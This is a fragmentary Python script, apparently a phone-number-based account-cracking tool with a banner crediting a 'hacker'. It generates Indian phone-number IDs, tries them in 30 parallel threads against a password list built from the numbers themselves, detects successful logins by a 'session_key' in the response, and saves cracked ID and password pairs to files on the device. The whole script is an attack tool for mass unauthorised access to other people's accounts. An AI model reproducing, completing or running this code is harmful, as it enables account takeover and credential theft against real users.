...
logo=("""\x1b[1;97m
     ...
     │ [💸] WHATSAPP : NOT FOUND       │
     │ [💸] VERSION  : 1.3                   │
     │ [💸] HACKED   : \033[1;32mMr. ABC \033[1;37m              │
     └───────────────────────────────────────┘""")
def linex():
        print(50*'_')
def clear():
...
def india():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = '+91'+code+psx
                                passlist = ['57273200;59039200;57575752;57575751',psx,code+psx]
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [AYAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/ayan-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;123m [ayan-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ayan-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
